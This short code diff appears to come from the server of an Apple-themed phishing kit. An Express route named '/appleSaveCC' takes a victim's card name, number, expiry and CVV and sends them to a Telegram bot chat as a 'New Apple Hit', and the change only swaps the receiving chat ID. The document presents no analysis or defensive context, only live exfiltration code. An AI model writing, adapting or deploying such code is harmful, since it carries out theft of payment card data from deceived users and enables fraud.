@@ -2017,7 +2017,7 @@ app.post("/appleSaveCC", cors(), (req, res) => {
 
   if (owner == "bali2810" && appleCount !== 3) {
     axios.post(
-      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-607323972&text=New Apple Hit:\n\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Apple Hit:\n\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`
     );
   }
 
